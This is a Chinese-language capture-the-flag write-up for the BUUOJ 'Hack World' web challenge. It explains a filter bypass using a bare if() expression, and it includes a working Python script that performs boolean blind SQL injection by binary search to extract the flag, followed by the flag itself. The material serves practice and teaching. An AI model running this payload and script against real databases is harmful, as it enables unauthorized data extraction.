# [CISCN2019 华北赛区 Day2 Web1]Hack World

[题目地址](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World)

这题倒是不难，也没有很多新知识，只是自己不熟没法一下子想出来和组合在一起。

进入网站，表名字段名都给了，直接一步到爆内容。现在就是看看怎么爆了。随手试一下一点也不万能的万能密码，显示被过滤了。有过滤就跑fuzz，确认一下过滤了什么东西。显示没有过滤引号，空格和or之类的。确实如此，但也掩盖不了很多语句用不了的事实，因为这道题是组合过滤，单个字符没事，放在一起就有事了。一时间脑抽了，看了[wp](https://blog.csdn.net/l2872253606/article/details/125244044)，看到第一句我就会了。天天熬夜把脑子熬傻了。

测试几个id，1和2都有回显内容，不过输入没有的id会显示“Error Occured When Fetch Result”。这题和其他sql注入不一样的地方在于，其他题关于sql注入第一个想法肯定是找闭合，而这道题不需要闭合就能执行sql语句。尝试[if语句](https://blog.csdn.net/wzzfeitian/article/details/55097563)。

- if(1,1,2)
> Hello, glzjin wants a girlfriend.

没错就是直接填个if语句，没有引号没有注释，都能回显出内容。知道这点这题就没啥了，可以直接用=号无脑爆，或者使用二分法,效率会高很多。

```python
import requests
url = "http://88b61e4e-51b6-49d7-bde7-d085703814f9.node4.buuoj.cn:81/index.php"
flag = ""
i = 0
while True:
    i = i + 1
    left = 32
    right = 127
    while left < right:
        mid = (left+right) // 2
        payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"
        data = {"id":payload} 
        res = requests.post(url=url, data=data).text
        if "Hello" in res:
            left = mid + 1
        else:
            right = mid
    if left != 32:
        flag += chr(left)
    else:
        print(flag)
        break
```

## Flag
> flag{bf687983-e3f4-414a-85d7-b8d5eaf3dfa3}